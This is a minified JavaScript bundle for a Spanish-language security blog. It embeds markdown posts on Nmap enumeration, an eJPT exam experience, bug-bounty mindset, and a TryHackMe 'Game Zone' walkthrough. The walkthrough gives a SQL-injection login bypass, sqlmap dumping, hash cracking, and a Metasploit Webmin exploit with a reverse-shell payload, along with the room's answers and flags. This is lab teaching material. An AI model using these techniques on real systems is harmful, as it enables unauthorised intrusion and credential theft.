s.refetchOnReconnect>"u"&&(s.refetchOnReconnect=s.networkMode!=="always"),typeof s.useErrorBoundary>"u"&&(s.useErrorBoundary=!!s.suspense),s}defaultMutationOptions(i){return i!=null&&i._defaulted?i:{...this.defaultOptions.mutations,...this.getMutationDefaults(i?.mutationKey),...i,_defaulted:!0}}clear(){this.queryCache.clear(),this.mutationCache.clear()}}const defaultContext=reactExports.createContext(void 0),QueryClientSharingContext=reactExports.createContext(!1);function getQueryClientContext(o,i){return o||(i&&typeof window<"u"?(window.ReactQueryClientContext||(window.ReactQueryClientContext=defaultContext),window.ReactQueryClientContext):defaultContext)}const QueryClientProvider=({client:o,children:i,context:s,contextSharing:c=!1})=>{reactExports.useEffect(()=>(o.mount(),()=>{o.unmount()}),[o]);const d=getQueryClientContext(s,c);return reactExports.createElement(QueryClientSharingContext.Provider,{value:!s&&c},reactExports.createElement(d.Provider,{value:o},i))},queryClient=new QueryClient({defaultOptions:{queries:{staleTime:1e3*60*5,retry:1,refetchOnWindowFocus:!1,refetchOnMount:!1},mutations:{retry:1}}}),initialState={theme:"system",setTheme:()=>null},ThemeProviderContext=reactExports.createContext(initialState);function ThemeProvider({children:o,defaultTheme:i="system",storageKey:s="vite-ui-theme",...c}){const[d,f]=reactExports.useState(()=>localStorage.getItem(s)||i);reactExports.useEffect(()=>{const u=window.document.documentElement;if(u.classList.remove("light","dark"),d==="system"){const m=window.matchMedia("(prefers-color-scheme: dark)").matches?"dark":"light";u.classList.add(m);return}u.classList.add(d)},[d]);const h={theme:d,setTheme:u=>{localStorage.setItem(s,u),f(u)}};return jsxRuntimeExports.jsx(ThemeProviderContext.Provider,{...c,value:h,children:o})}const perfil="/assets/perfil-D9Hfuo_M.png";function DiscordIcon({className:o=""}){return jsxRuntimeExports.jsx("svg",{xmlns:"http://www.w3.org/2000/svg",viewBox:"0 0 24 24",className:o,fill:"currentColor",role:"img","aria-hidden":"true",children:jsxRuntimeExports.jsx("path",{d:"M20.317 4.37a19.791 19.791 0 0 0-4.885-1.515.074.074 0 0 0-.079.037c-.21.375-.444.864-.608 1.25a18.27 18.27 0 0 0-5.487 0 12.64 12.64 0 0 0-.617-1.25.077.077 0 0 0-.079-.037A19.736 19.736 0 0 0 3.677 4.37a.07.07 0 0 0-.032.027C.533 9.046-.32 13.58.099 18.057a.082.082 0 0 0 .031.057 19.9 19.9 0 0 0 5.993 3.03.078.078 0 0 0 .084-.028 14.09 14.09 0 0 0 1.226-1.994.076.076 0 0 0-.041-.106 13.107 13.107 0 0 1-1.872-.892.077.077 0 0 1-.008-.128 10.2 10.2 0 0 0 .372-.292.074.074 0 0 1 .077-.01c3.928 1.793 8.18 1.793 12.062 0a.074.074 0 0 1 .078.01c.12.098.246.198.373.292a.077.077 0 0 1-.006.127 12.299 12.299 0 0 1-1.873.892.077.077 0 0 0-.041.107c.36.698.772 1.362 1.225 1.993a.076.076 0 0 0 .084.028 19.839 19.839 0 0 0 6.002-3.03.077.077 0 0 0 .032-.054c.5-5.177-.838-9.674-3.549-13.66a.061.061 0 0 0-.031-.03zM8.02 15.33c-1.183 0-2.157-1.085-2.157-2.419 0-1.333.956-2.419 2.157-2.419 1.21 0 2.176 1.096 2.157 2.42 0 1.333-.956 2.418-2.157 2.418zm7.975 0c-1.183 0-2.157-1.085-2.157-2.419 0-1.333.955-2.419 2.157-2.419 1.21 0 2.176 1.096 2.157 2.42 0 1.333-.946 2.418-2.157 2.418z"})})}const navigation=[{name:"Inicio",icon:House,href:"/"},{name:"Etiquetas",icon:Tags$1,href:"/tags"},{name:"Contenido",icon:FileText,href:"/content"},{name:"Acerca de",icon:User,href:"/about"}],socialLinks=[{name:"GitHub",icon:Github,href:"https://github.com/Zuk4r1"},{name:"Email",icon:Mail,href:"mailto:investigacion1956@gmail.com"},{name:"LinkedIn",icon:Linkedin,href:"https://www.linkedin.com/in/yordan-antonio-suarez-rojas-49706326b/"},{name:"Discord",icon:DiscordIcon,href:"https://discord.com/channels/zuk4r1"}];function Sidebar(){return jsxRuntimeExports.jsxs("aside",{className:`hidden md:flex md:fixed md:left-0 md:top-0 md:bottom-0 md:w-64 glass-panel panel-float panel-hardware
                       border-r border-cyber-border flex-col overflow-hidden z-40`,children:[jsxRuntimeExports.jsxs("div",{className:"flex-1 overflow-y-auto scrollbar-hide",children:[jsxRuntimeExports.jsxs("div",{className:"p-5 text-center border-b border-cyber-border/30",children:[jsxRuntimeExports.jsx("img",{src:perfil,alt:"Perfil",className:"w-24 h-24 mx-auto rounded-full border-2 border-cyber-primary mb-3 avatar-glow transition-transform duration-300 hover:scale-110"}),jsxRuntimeExports.jsx("h1",{className:"text-lg font-cyber font-bold text-cyber-primary glow-text mb-3",children:"Zuk4r1"}),jsxRuntimeExports.jsx("p",{className:"text-sm text-white px-3 glow-text",children:"Donde la curiosidad impulsa la seguridad."})]}),jsxRuntimeExports.jsx("nav",{className:"p-6",children:jsxRuntimeExports.jsx("ul",{className:"space-y-4",children:navigation.map(o=>{const i=o.icon;return jsxRuntimeExports.jsx("li",{children:jsxRuntimeExports.jsxs(NavLink,{to:o.href,className:({isActive:s})=>"flex items-center gap-4 px-4 py-3 rounded-lg transition-all duration-300 relative overflow-hidden group "+(s?"text-cyber-primary border border-cyber-primary/40 bg-cyber-primary/10 shadow-[0_0_12px_rgba(0,255,159,0.15)] translate-x-1":"text-cyber-text hover:text-cyber-primary hover:bg-cyber-primary/5 hover:translate-x-1 hover:border hover:border-cyber-primary/20"),children:[jsxRuntimeExports.jsx("div",{className:"absolute left-0 top-0 bottom-0 w-0.5 bg-cyber-primary opacity-0 transition-all duration-300 group-hover:opacity-100 group-[.active]:opacity-100"}),jsxRuntimeExports.jsx(i,{className:"h-5 w-5 transition-transform duration-300 group-hover:scale-110"}),jsxRuntimeExports.jsx("span",{className:"font-mono text-sm tracking-wide font-bold uppercase",children:o.name})]})},o.name)})})})]}),jsxRuntimeExports.jsxs("div",{className:"p-6 border-t border-cyber-border/30 bg-black/20",children:[jsxRuntimeExports.jsx("p",{className:"text-center text-white text-xs uppercase tracking-[0.2em] mb-4 font-cyber",children:"Conectar"}),jsxRuntimeExports.jsx("div",{className:"flex justify-center gap-3 mb-6",children:socialLinks.map(o=>{const i=o.icon;return jsxRuntimeExports.jsx("a",{href:o.href,target:"_blank",rel:"noopener noreferrer",className:`w-10 h-10 flex items-center justify-center rounded-lg bg-cyber-card border border-cyber-border/50 
                           shadow-lg hover:shadow-neon hover:border-cyber-primary hover:-translate-y-1 transition-all duration-300 group`,"aria-label":o.name,children:jsxRuntimeExports.jsx(i,{className:"h-5 w-5 text-cyber-muted group-hover:text-cyber-primary transition-colors duration-300"})},o.name)})}),jsxRuntimeExports.jsxs("div",{className:"text-center text-xs text-white/80 font-mono tracking-wide",children:[jsxRuntimeExports.jsx("p",{children:"©2026–2027 Zuk4r1"}),jsxRuntimeExports.jsx("p",{children:"Derechos reservados"})]})]})]})}function SidebarOverlay({onClose:o}){return jsxRuntimeExports.jsxs(motion.div,{className:"fixed inset-0 z-50 md:hidden backdrop-blur-sm",initial:{opacity:0},animate:{opacity:1},exit:{opacity:0},transition:{duration:.2},children:[jsxRuntimeExports.jsx(motion.div,{className:"absolute inset-0 bg-black/60",onClick:o,initial:{opacity:0},animate:{opacity:1},exit:{opacity:0}}),jsxRuntimeExports.jsxs(motion.aside,{className:"absolute left-0 top-0 bottom-0 w-72 glass-panel border-r border-cyber-border flex flex-col overflow-hidden shadow-2xl",initial:{x:"-100%"},animate:{x:0},exit:{x:"-100%"},transition:{type:"spring",stiffness:300,damping:30},children:[jsxRuntimeExports.jsx(motion.div,{className:"absolute top-0 left-0 right-0 h-1 bg-gradient-to-r from-transparent via-cyber-primary to-transparent",initial:{opacity:0},animate:{opacity:[0,1,.5]},transition:{duration:.6}}),jsxRuntimeExports.jsxs("div",{className:"flex items-center justify-between p-4 border-b border-cyber-border/30 bg-cyber-primary/5",children:[jsxRuntimeExports.jsx("h2",{className:"text-sm font-cyber text-cyber-primary tracking-widest uppercase",children:"Sistema"}),jsxRuntimeExports.jsx(motion.button,{onClick:o,className:"text-cyber-muted hover:text-cyber-primary transition-colors p-2 hover:bg-cyber-primary/10 rounded-md",whileHover:{scale:1.1},whileTap:{scale:.95},children:jsxRuntimeExports.jsx(X,{className:"h-5 w-5"})})]}),jsxRuntimeExports.jsxs("div",{className:"flex-1 overflow-y-auto",children:[jsxRuntimeExports.jsxs("div",{className:"p-8 text-center border-b border-cyber-border/30 relative",children:[jsxRuntimeExports.jsx("div",{className:"absolute top-0 left-0 w-full h-1 bg-gradient-to-r from-transparent via-cyber-primary to-transparent opacity-50"}),jsxRuntimeExports.jsx(motion.img,{src:perfil,alt:"Perfil",className:"w-24 h-24 mx-auto rounded-full border-2 border-cyber-primary mb-4 avatar-glow",animate:{scale:[1,1.05,1]},transition:{duration:2,repeat:1/0}}),jsxRuntimeExports.jsx("h1",{className:"text-lg font-cyber text-cyber-primary glow-text mb-2",children:"Zuk4r1"}),jsxRuntimeExports.jsx("p",{className:"text-xs text-cyber-text/70 font-mono",children:"<SecurityResearcher />"})]}),jsxRuntimeExports.jsx("nav",{className:"p-6",children:jsxRuntimeExports.jsx("ul",{className:"space-y-4",children:navigation.map((i,s)=>{const c=i.icon;return jsxRuntimeExports.jsx(motion.li,{initial:{opacity:0,x:-20},animate:{opacity:1,x:0},transition:{delay:s*.1},children:jsxRuntimeExports.jsxs(NavLink,{to:i.href,className:({isActive:d})=>"flex items-center gap-4 px-4 py-3 rounded-lg transition-all duration-200 border "+(d?"bg-cyber-primary/10 text-cyber-primary border-cyber-primary/40 shadow-neon-sm":"border-transparent text-cyber-text hover:bg-cyber-primary/5 hover:text-cyber-primary hover:border-cyber-primary/20"),onClick:o,children:[jsxRuntimeExports.jsx(c,{className:"h-5 w-5"}),jsxRuntimeExports.jsx("span",{className:"font-mono text-sm uppercase font-bold",children:i.name})]})},i.name)})})})]}),jsxRuntimeExports.jsx("div",{className:"p-6 border-t border-cyber-border/30 bg-black/20",children:jsxRuntimeExports.jsx("div",{className:"flex justify-center gap-4",children:socialLinks.map(i=>{const s=i.icon;return jsxRuntimeExports.jsx(motion.a,{href:i.href,target:"_blank",rel:"noopener noreferrer",className:`w-10 h-10 flex items-center justify-center rounded-lg bg-cyber-card border border-cyber-border 
                             hover:border-cyber-primary hover:text-cyber-primary hover:shadow-neon transition-all duration-300`,whileHover:{scale:1.1,y:-2},whileTap:{scale:.95},children:jsxRuntimeExports.jsx(s,{className:"h-5 w-5"})},i.name)})})})]})]})}const __vite_glob_0_0=`---\r
title: "Enumeración Avanzada con Nmap en Pentesting: Técnicas Reales de Reconocimiento"\r
date: 2026-03-16\r
author: Zuk4r1\r
tags: [pentesting, nmap, reconnaissance, hacking-etico, enumeracion]\r
readTime: 8 min\r
description: "Guía técnica sobre el uso avanzado de Nmap para descubrimiento de hosts, identificación de servicios y detección de vectores de ataque durante auditorías de seguridad."\r
---\r
\r
# Enumeración Avanzada con Nmap en Pentesting\r
\r
En cualquier **auditoría de seguridad o laboratorio de pentesting**, la fase de **reconocimiento y enumeración** determina en gran medida el éxito de una explotación posterior.\r
\r
Una de las herramientas más utilizadas por profesionales de seguridad es **Nmap**, debido a su capacidad para descubrir hosts, servicios, versiones y posibles vulnerabilidades.\r
\r
En este artículo veremos técnicas reales utilizadas durante **evaluaciones de seguridad y CTFs**.\r
\r
---\r
\r
# 1. Descubrimiento de Hosts en la Red\r
\r
Antes de atacar un sistema debemos identificar qué dispositivos están activos.\r
\r
### Escaneo de red básico\r
\r
\`\`\`bash\r
nmap -sn 192.168.1.0/24\r
\`\`\`\r
\r
# Este comando permite:\r
\r
✅ Descubrir hosts activos\r
\r
✅ Evitar escaneo de puertos\r
\r
✅ Obtener direcciones IP disponibles\r
\r
Resultado esperado:\r
\r
\`\`\`bash\r
Nmap scan report for 192.168.1.10\r
Host is up (0.0020s latency)\r
\r
Nmap scan report for 192.168.1.15\r
Host is up (0.0031s latency)\r
\`\`\`\r
\r
# 2. Identificación de Puertos Abiertos\r
\r
Una vez identificado el objetivo se procede al escaneo de puertos.\r
\r
Escaneo rápido de puertos comunes\r
\r
\`\`\`bash\r
nmap -F 192.168.1.10\r
\`\`\`\r
\r
# Escaneo completo\r
\r
\`\`\`bash\r
nmap -p- 192.168.1.10\r
\`\`\`\r
Este escaneo analiza los 65535 puertos TCP.\r
\r
Ejemplo de resultado:\r
\r
\`\`\`bash\r
PORT     STATE SERVICE\r
22/tcp   open  ssh\r
80/tcp   open  http\r
445/tcp  open  microsoft-ds\r
3306/tcp open  mysql\r
\`\`\`\r
\r
# 3. Identificación de Versiones de Servicios\r
\r
Conocer la versión del servicio permite detectar vulnerabilidades conocidas.\r
\r
\`\`\`bash\r
nmap -sV 192.168.1.10\r
\`\`\`\r
Resultado:\r
\r
\`\`\`bash\r
PORT   STATE SERVICE VERSION\r
22/tcp open  ssh     OpenSSH 7.2p2\r
80/tcp open  http    Apache 2.4.18\r
\`\`\`\r
\r
Esto permite posteriormente buscar exploits en bases como:\r
\r
✅ ExploitDB\r
\r
✅ NVD\r
\r
✅ Metasploit\r
\r
# 4. Detección de Sistema Operativo\r
\r
Para identificar el sistema operativo del objetivo:\r
\r
\`\`\`bash\r
nmap -O 192.168.1.10\r
\`\`\`\r
\r
Salida posible:\r
\r
\`\`\`bash\r
OS details: Linux 4.x\r
\`\`\`\r
Esto es fundamental para elegir correctamente los vectores de explotación.\r
\r
# 5. Uso de Scripts NSE para Enumeración\r
\r
El Nmap Scripting Engine (NSE) permite automatizar tareas de enumeración.\r
\r
Enumeración SMB\r
\r
\`\`\`bash\r
nmap --script smb-enum-shares -p445 192.168.1.10\r
\`\`\`\r
\r
Enumeración HTTP\r
\r
\`\`\`bash\r
nmap --script http-enum -p80 192.168.1.10\r
\`\`\`\r
\r
Estos scripts pueden revelar:\r
\r
✅ Directorios ocultos\r
\r
✅ Usuarios\r
\r
✅ Shares SMB\r
\r
✅ Configuraciones inseguras\r
\r
# 6. Escaneo Completo Usado en Pentesting\r
\r
Un escaneo común utilizado por profesionales es:\r
\r
\`\`\`bash\r
nmap -sC -sV -O -p- 192.168.1.10\r
\`\`\`\r
\r
Este comando realiza:\r
\r
✅ Escaneo de scripts por defecto\r
\r
✅ Identificación de versiones\r
\r
✅ Detección de sistema operativo\r
\r
✅ Escaneo completo de puertos\r
\r
# Conclusión\r
\r
La enumeración es una fase crítica dentro del ciclo de hacking ético.\r
Una correcta recopilación de información permite:\r
\r
✅ Identificar servicios vulnerables\r
\r
✅ Detectar configuraciones inseguras\r
\r
✅ Preparar la explotación posterior\r
\r
✅ Dominar herramientas como Nmap es fundamental para cualquier profesional de ciberseguridad, pentesting o bug bounty.`,__vite_glob_0_1=`---\r
title: "Game Zone — Recorrido por la sala TryHackMe"\r
description: "Game Zone es una interesante sala de TryHackMe con elementos de juego en la que aprenderás a explotar una vulnerabilidad de inyección SQL, descifrar un hash para obtener un acceso inicial a un sistema objetivo y, a partir de ese acceso inicial, realizar un pivoteo y escalar tus privilegios."\r
date: "2025-11-26"\r
published: true\r
tags: ["tryhackme", "pentesting", "writeup", "webmin", "sqli", "pivoting"]\r
readTime: "20 min"\r
---\r
## Introduccion\r
\r
**Game Zone** es una interesante sala de TryHackMe con elementos de juego en la que aprenderás a explotar una vulnerabilidad de **inyección SQL**, **descifrar un hash** para obtener un acceso inicial a un sistema objetivo y, a partir de ese acceso inicial, realizar un **pivoteo** y escalar tus **privilegios**.\r
\r
---\r
\r
## ⚙️ Configuración\r
\r
Agregamos la IP de la sala a nuestro archivo hosts sera nuestra maquina que corramos en ese instante de igual forma tryhackme es la que nos da la ip de la maquina que vamos a explotar:\r
\r
\`\`\`bash\r
echo "10.64.144.150 game-zone.tryhackme.com" >> /etc/hosts\r
\`\`\`\r
Realizmos un ping a la sala para verificar que la IP se haya agregado correctamente:\r
\r
\`\`\`bash\r
ping game-zone.tryhackme.com\r
\`\`\`\r
\r
## Desplegar la máquina vulnerable\r
\r
Para encontrar el nombre del avatar de dibujos animados en cuestión, podemos realizar una *búsqueda inversa* de imágenes utilizando la búsqueda visual de google.\r
\r
## 🔎 Escaneo Inicial con Nmap\r
\r
Sigamos la metodología de una prueba de penetración real detectando primero los puertos abiertos cin sus respectivas versiones y luego intentando explotarlos.\r
\r
\`\`\`bash\r
nmap -sVC -p- -Pn -T5 --min-rate 25000 10.64.144.150\r
\`\`\`\r
\r
Despues del escaneo con nmap podemos ver que tiene el puerto 80 abierto corriendo un servidor web apache.\r
\r
## ⚡ Enumeración de servicios y versiones.\r
\r
**HTTP**\r
\r
Echemos un vistazo rápido utilizando la extension de **wappalyzer** para identificar las tecnologias usadas y sus versiones o tambien podemos usar **whatweb -v <IP>** directamenta en la terminal y nos dara los mismos resultados que **wappalyzer**\r
\r
Aquí, **wappalyzer** nos proporcionó información útil como la siguiente:\r
\r
- El servidor web utilizado y su versión (Apache 2.4.18)\r
- El lenguaje de programación de back-end (PHP)\r
- El sistema operativo utilizado por el servidor web (Ubuntu)\r
Con base en la información recopilada anteriormente, podemos realizar una investigación de vulnerabilidades para comprobar si la versión del servidor Apache es vulnerable o no.\r
\r
## Investigación sobre vulnerabilidad\r
\r
Aquí vamos a utilizar una herramienta llamada searchsploit :\r
\r
 \`\`\`bash\r
 searchsploit apache 2.4\r
 \`\`\`\r
\r
Lamentablemente, no se ha encontrado ninguna vulnerabilidad relacionada con la versión de Apache del objetivo.\r
\r
Sin embargo, si presta atención a la página web anterior, es posible que haya notado un formulario de inicio de sesión de usuario.\r
\r
Aquí reside una posible vulnerabilidad, ya que se puede introducir el nombre de usuario como otra consulta SQL . Esto permitirá escribir, insertar y ejecutar la consulta.\r
\r
Más específicamente, esta vulnerabilidad se denomina vulnerabilidad de inyección SQL.\r
\r
## Inyección SQL\r
\r
Encontramos un formulario de autenticación básico. Probamos inyección SQL manual:\r
\r
 \`\`\`bash\r
user: 'or 1=1--\r
password: <vacío>\r
 \`\`\`\r
\r
Como podemos ver, la inyección SQL ha funcionado correctamente permitiendo el bypass de login. Ahora, necesitamos obtener acceso inicial al sistema objetivo.\r
\r
## Pregunta \r
When you've logged in, what page do you get redirected to?\r
**Respuesta: portal.php**\r
\r
## 🕷️ Capturando Petición con Burp Suite\r
\r
Antes de ejecutar automatización, interceptamos la solicitud POST para analizarla en detalle.\r
\r
En Burp Suite:\r
\r
- Activamos proxy\r
\r
- Iniciamos sesión con el payload\r
\r
- Guardamos la solicitud como responder.txt\r
\r
## 💉 Explotación Automatizada con SQLmap\r
\r
Utilizamos SQLmap para explotar la inyección SQL:\r
\r
\`\`\`bash\r
sqlmap -r responder.txt --dbms=mysql --dump\r
\`\`\`\r
## Pregunta \r
\r
In the users table, what is the hashed password?\r
\r
**Respuesta: ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14**\r
\r
What was the username associated with the hashed password?\r
\r
**Respuesta: agent47**\r
\r
What was the other table name?\r
\r
**Respuesta: post**\r
\r
El volcado muestra credenciales:\r
\r
\`\`\`bash\r
| pwd                                                              | username |\r
+------------------------------------------------------------------+----------+\r
| ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14 | agent47  |\r
+------------------------------------------------------------------+----------+\r
\`\`\`\r
\r
## 🔓 Cracking de Hash con John\r
\r
Guardamos el hash en hash.txt y lo crackeamos con John:\r
\r
\`\`\`bash\r
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt\r
\`\`\`\r
## Pregunta \r
\r
What is the de-hashed password?\r
\r
**Respuesta: videogamer124**\r
\r
John nos muestra la contraseña:\r
\r
\`\`\`bash\r
videogamer124\r
\`\`\`\r
What is the user flag?\r
\r
**Respuesta: 649ac17b1480ac13ef1e4fa579dac95c**\r
\r
## 🧑‍💻 Acceso por SSH\r
\r
Con las credenciales válidas:\r
\r
\`\`\`bash\r
ssh agent47@10.64.144.150\r
\`\`\`\r
\r
Una vez dentro, obtenemos la flag del usuario:\r
\r
\`\`\`bash\r
cat user.txt\r
\`\`\`\r
\r
## Enumeración Interna del Sistema\r
\r
Validamos servicios activos:\r
\r
\`\`\`bash\r
ss -tulpn\r
\`\`\`\r
\r
Detectamos que está escuchando Webmin en un puerto accesible solo localmente.\r
\r
## Pregunta \r
\r
How many TCP sockets are running?\r
\r
**Respuesta: 5**\r
\r
What is the name of the exposed CMS?\r
\r
**Respuesta: Webmin**  \r
\r
What is the CMS version?\r
\r
**Respuesta: 1.580**\r
\r
## 🔁 Túnel SSH para Acceder a Webmin\r
\r
Creamos un túnel SSH de puerto local hacia la instancia remota:\r
\r
\`\`\`bash\r
ssh -L 10000:localhost:10000 agent47@10.64.144.150\r
\`\`\`\r
\r
Luego accedemos desde el navegador:\r
\r
\`\`\`bash\r
http://localhost:10000\r
\`\`\`\r
## 💣 Explotación de Webmin con Metasploit (versión 1.580)\r
\r
Abrimos Metasploit:\r
\r
\`\`\`bash\r
msfconsole\r
\`\`\`\r
\r
Buscamos módulos vulnerables:\r
\r
\`\`\`bash\r
searchsploit webmin\r
\`\`\`\r
\r
Seleccionamos el exploit:\r
\r
\`\`\`bash\r
use exploit/unix/webapp/webmin_backdoor\r
\`\`\`\r
\r
Configuramos parámetros:\r
\r
\`\`\`bash\r
set RHOST localhost\r
set LHOST 10.64.144.150\r
set USERNAME agent47\r
set PASSWORD videogamer124\r
set PAYLOAD cmd/unix/reverse\r
set SSL false\r
run\r
\`\`\`\r
\r
## Pregunta Final\r
\r
What is the root flag?\r
\r
**Respuesta: a4b945830144bdd71908d12d902adeee**\r
\r
## 🎉 Conclusión\r
\r
La máquina Gamer Zone combina varios vectores importantes:\r
\r
- Inyección SQL clásica\r
\r
- Cracking de hashes\r
\r
- Acceso SSH\r
\r
- Túneles locales para acceder a servicios internos\r
\r
- Explotación de Webmin con Metasploit\r
\r
\r
Es un excelente laboratorio para perfeccionar técnicas de acceso inicial y escalada de privilegios en entornos controlados.\r
\r
`,__vite_glob_0_2=`---\r
title: "💥 Cómo aprobé el examen eJPT en solo 3 horas con una puntuación del 85 %"\r
description: "Mi experiencia aprobando el eJPT en tiempo récord: metodología, herramientas clave, estrategia y consejos prácticos para superar el examen sin perder tiempo."\r
author: "Zuk4r1"\r
date: "2026-03-22"\r
published: true\r
tags: ["ejpt", "pentesting", "ethical hacking", "ciberseguridad", "red team", "certificaciones", "hacking web"]\r
readTime: "8 min"\r
---\r
\r
# 💥 Cómo aprobé el examen eJPT en solo 3 horas con una puntuación del 85 %\r
\r
Aprobar el eJPT (eLearnSecurity Junior Penetration Tester) es uno de los primeros grandes hitos en el mundo del pentesting. En mi caso, no solo logré aprobarlo, sino que lo hice en aproximadamente 3 horas y con una puntuación del 85 %. Aquí te cuento exactamente cómo lo hice y qué me funcionó.\r
\r
---\r
\r
## 🎯 ¿Qué es exactamente eJPT?\r
\r
La certificación eLearnSecurity Junior Penetration Tester (eJPT) , ofrecida por INE (anteriormente eLearnSecurity), es una credencial práctica de nivel básico diseñada para cualquier persona interesada en la seguridad ofensiva . A diferencia de los exámenes tradicionales, no se trata de memorizar teoría, sino de aplicar habilidades en un entorno de laboratorio real. El examen evalúa tu capacidad para realizar pruebas de host, red y aplicaciones web, explotar vulnerabilidades y realizar pruebas de penetración en diferentes redes, simulando esencialmente una prueba de penetración real.\r
\r
*Tipo de examen: Laboratorio virtual basado en navegador*\r
*Duración: 48 horas*\r
*Preguntas: 35 tareas prácticas*\r
*Puntuación mínima para aprobar: 70%*\r
*Validez: 6 meses a partir de la fecha de compra.*\r
\r
---\r
\r
# Pautas y puntos clave del examen\r
\r
Antes de comenzar, lea las Directrices del Laboratorio y la Carta de Compromiso.\r
Aspectos clave que debe saber sobre el examen:\r
\r
✅ Kali en el navegador (RDP a través de Guacamole): preconfigurado con todas las herramientas; no es necesario instalar nada.\r
\r
✅ Kali no tiene conexión a internet ; utilice el navegador de su sistema operativo para investigar; utilice el portapapeles de Guacamole para copiar y pegar.\r
\r
✅ **Guarda todo localmente :** los reinicios del laboratorio borran la máquina virtual, así que guarda las notas, las capturas de pantalla y los resultados de los análisis en tu ordenador.\r
\r
✅ Las banderas son dinámicas por sesión y están vinculadas a su instancia de laboratorio.\r
\r
✅ El laboratorio y el cuestionario estarán disponibles durante 48 horas ; puedes responder a las preguntas en cualquier orden.\r
\r
✅ **Alcance:** comenzar en la DMZ y luego expandirse hacia las redes internas accesibles; tratarlo como una interacción real.\r
\r
✅ Las herramientas recomendadas vienen preinstaladas (Nmap, Metasploit, Hydra, WPScan, etc.).\r
\r
✅ Asegúrese de tener una conexión a internet estable y lea ambos documentos completos antes de comenzar.\r
\r
# Categorías de preguntas de examen\r
\r
En concreto, las preguntas del examen se pueden clasificar en cuatro categorías principales: **Metodologías de evaluación** , **Auditoría de host y red** , **Pruebas de penetración de host y red** , y **Pruebas de penetración de aplicaciones web** . Al centrarse en estas actividades clave, podrá estructurar su flujo de trabajo y abordar las tareas del examen de manera eficiente.\r
\r
✅ **Metodologías de evaluación:** Planificar la estrategia, recopilar información sobre los objetivos y analizar los posibles vectores de ataque.\r
\r
✅ **Auditoría de hosts y redes:** Descubrimiento de hosts activos, enumeración de servicios, identificación de sistemas operativos, comprobación de niveles de parches y mapeo de redes.\r
\r
✅ **Pruebas de penetración en hosts y redes:** Explotación de vulnerabilidades, escalada de privilegios, movimiento lateral y recuperación de datos confidenciales.\r
Pruebas de penetración en aplicaciones web: Identificación de aplicaciones, enumeración de usuarios y contenido, explotación de vulnerabilidades web y acceso a datos protegidos.\r
\r
# Recursos adicionales\r
\r
Además de esto, resolví estas salas de TryHackMe para practicar habilidades similares en diferentes entornos:\r
\r
✅ [Ignite](https://tryhackme.com/room/ignite): Calentamiento para principiantes sobre reconocimiento web y explotación básica.\r
\r
✅ [Startup](https://tryhackme.com/room/startup): Errores de configuración web, servicios FTP/anónimos y prácticas de escalada de privilegios.\r
\r
✅ [RootMe](https://tryhackme.com/room/rrootme): Introducción a una caja de estilo CTF para la enumeración de hosts y la escalada de privilegios locales.\r
\r
✅ [Blog](https://tryhackme.com/room/blog): **Enfoque en aplicaciones web:** enumeración de contenido, interacciones WordPress/PYMES, encadenamiento de pequeños fallos web.\r
\r
✅ [Blue](https://tryhackme.com/room/blue): laboratorio de Windows para enumeración de SMB/Windows, obtención de credenciales y flujos de trabajo posteriores a la explotación.\r
\r
✅ [Blueprint](https://tryhackme.com/room/blueprint): **Nivel intermedio:** encadenar exploits web con movimientos de pivote y laterales.\r
\r
# Resultados y conclusiones\r
\r
El curso de fundamentos puede parecer repetitivo a veces, pero como principiante, te ayuda a familiarizarte con el proceso y el flujo de trabajo. Invierte en los fundamentos, practica con constancia, toma apuntes personales y aborda el examen metódicamente. Aunque yo lo terminé en unas pocas horas, la mayoría tarda entre 8 y 10 horas de media, así que no te apresures. Disfruta del proceso, confía en ti mismo y tómate descansos frecuentes si te sientes agotado. El aprendizaje y la confianza que adquieres son invaluables. Debido a limitaciones de tiempo, no pude completar el curso de fundamentos completo, así que me centré solo en resolver los laboratorios de los módulos.`,__vite_glob_0_3=`---\r
title: "⚡ Por qué no encuentras bugs aunque sepas herramientas"\r
date: 2026-03-17\r
author: Zuk4r1\r
tags: [bugbounty, hacking-etico, ciberseguridad, mindset, pentesting]\r
readTime: 7 min\r
description: "Muchos saben usar herramientas de hacking, pero pocos encuentran vulnerabilidades reales. Este artículo explica por qué sucede y cómo solucionarlo."\r
---\r
\r
# ⚡ Por qué no encuentras bugs aunque sepas herramientas\r
\r
Has aprendido a usar:\r
\r
- Nmap  \r
- Burp Suite  \r
- Metasploit  \r
- Dirsearch  \r
\r
Sabes escanear, enumerar y lanzar pruebas…\r
\r
Pero aun así:  \r
**no encuentras vulnerabilidades reales.**\r
\r
Si te pasa esto, no es falta de herramientas.  \r
Es un problema de enfoque.\r
\r
---\r
\r
# El Error Más Común\r
\r
La mayoría de personas cae en esto:\r
\r
> Usar herramientas sin entender qué están buscando\r
\r
Ejemplo típico:\r
\r
- Ejecutas un scanner  \r
- Ves resultados  \r
- No sabes qué significa realmente  \r
- Pasas al siguiente objetivo  \r
\r
Resultado: **0 bugs**\r
\r
---\r
\r
# Las Herramientas No Piensan\r
\r
Las herramientas hacen 3 cosas:\r
\r
✔ Automatizar  \r
✔ Acelerar  \r
✔ Detectar patrones conocidos  \r
\r
Pero NO hacen:\r
\r
❌ Entender lógica de negocio  \r
❌ Detectar fallos creativos  \r
❌ Pensar como atacante  \r
\r
---\r
\r
# El Verdadero Problema: No Entiendes la Aplicación\r
\r
Encontrar bugs no es “atacar”, es **entender**.\r
\r
Preguntas clave que casi nadie se hace:\r
\r
- ¿Cómo funciona el login realmente?  \r
- ¿Qué pasa si modifico este parámetro?  \r
- ¿Este flujo confía demasiado en el cliente?  \r
- ¿Qué pasaría si fuera un usuario malicioso?  \r
\r
Ahí es donde aparecen los bugs reales.\r
\r
---\r
\r
# Estás Buscando Donde Todos Buscan\r
\r
Otro error común:\r
\r
- Probar SQLi en todos los parámetros  \r
- Lanzar fuzzing automático sin análisis  \r
- Escanear sin contexto  \r
\r
Eso ya lo hacen miles de personas.\r
\r
Los bugs que pagan están en:\r
\r
- Lógica de negocio  \r
- Autorización rota  \r
- Flujos mal diseñados  \r
\r
---\r
\r
# No Estás Profundizando\r
\r
Muchos hacen esto:\r
\r
✔ Encuentran un endpoint  \r
❌ No lo analizan a fondo  \r
\r
Pero un hacker real:\r
\r
- Cambia parámetros  \r
- Repite requests  \r
- Rompe el flujo  \r
- Prueba escenarios inválidos  \r
\r
Ejemplo:\r
\r
\`\`\`bash\r
POST /api/transfer\r
amount=100&user_id=123\r
\`\`\`\r
